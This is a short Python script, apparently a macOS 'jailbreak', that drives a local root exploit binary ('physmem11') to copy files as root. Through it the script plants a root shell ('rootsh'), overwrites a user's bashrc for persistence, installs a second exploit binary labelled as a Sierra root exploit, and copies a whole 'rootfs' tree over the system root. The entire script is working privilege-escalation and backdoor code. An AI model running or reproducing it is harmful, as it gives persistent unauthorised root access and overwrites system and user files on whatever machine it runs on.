import os
import subprocess
def jailbreak():
    print ("pwning")
    os.system("./physmem11 root /bin/cp rootsh /")
    print("installed rootshell. adding entry to bashrc.")
    os.system("./physmem11 root /bin/cp check.py /usr/local/bin/rootsh")
    os.system("./physmem11 root /bin/cp bashrc /Users/" + os.getlogin() + "bashrc")
    print("copying macos sierra supported version of root exploit")
    os.system("./physmem11 root /bin/cp physmem12 /usr/local/bin/physmem12")
    print("copying rootfs.")
    os.system("./physmem11 root /bin/cp -R rootfs/* /")
    print("done.")
jailbreak()
